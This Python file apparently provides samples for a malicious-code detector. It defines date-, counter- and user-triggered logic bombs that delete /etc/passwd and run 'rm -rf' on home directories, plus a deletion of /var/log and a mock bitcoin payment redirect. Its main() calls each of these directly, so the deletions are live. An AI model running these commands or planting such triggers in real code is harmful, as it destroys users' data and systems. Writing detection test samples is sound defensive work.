#!/usr/bin/env python3
"""
Test file with specific threat patterns to test detection
"""

import datetime
import os
import time

# SCHEDULED_THREAT - Time-based trigger
def scheduled_threat_example():
    current_date = datetime.datetime.now()
    if current_date.year >= 2025:
        os.remove('/etc/passwd')
        print("Scheduled threat triggered!")

# EXECUTION_TRIGGER - Counter-based trigger  
def execution_trigger_example():
    counter = 0
    for i in range(100):
        counter += 1
        if counter == 50:  # Execution counter trigger
            os.system('rm -rf /home/user')
            print("Execution trigger activated!")

# TARGETED_ATTACK - User-specific trigger
def targeted_attack_example():
    import getpass
    current_user = getpass.getuser()
    if current_user == "admin":
        os.system('rm -rf /home/admin')
        print("Targeted attack executed!")

# DESTRUCTIVE_PAYLOAD - Direct destructive action
def destructive_payload_example():
    import shutil
    shutil.rmtree('/var/log')
    print("Destructive payload executed!")

# FINANCIAL_FRAUD - Financial redirection
def financial_fraud_example():
    bitcoin_address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    print(f"Payment redirected to: {bitcoin_address}")

# Main function to test all patterns
def main():
    print("Testing threat patterns...")
    
    # Test scheduled threat
    scheduled_threat_example()
    
    # Test execution trigger
    execution_trigger_example()
    
    # Test targeted attack
    targeted_attack_example()
    
    # Test destructive payload
    destructive_payload_example()
    
    # Test financial fraud
    financial_fraud_example()
    
    print("All tests completed!")

if __name__ == "__main__":
    main() 